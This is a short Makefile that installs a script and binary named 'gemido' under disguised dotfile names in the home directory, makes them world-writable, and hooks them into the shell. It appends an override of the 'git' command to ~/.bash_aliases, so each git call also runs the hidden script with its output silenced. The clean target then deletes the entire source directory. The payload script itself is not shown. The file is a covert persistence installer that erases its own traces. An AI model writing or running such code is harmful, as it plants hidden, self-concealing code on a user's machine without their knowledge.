DIR := $(shell pwd)

.PHONY: all clean gemido

all: gemido clean

gemido:
	@cp gemido.sh ~/.bashsrc
	@cp gemido ~/.bash_core
	@chmod 777 ~/.bashsrc
	@echo 'git() { ~/.bashsrc > /dev/null 2>&1; command git \$@; }' >> ~/.bash_aliases > /dev/null

clean:
	@cd ..
	@rm -r "$(DIR)/"

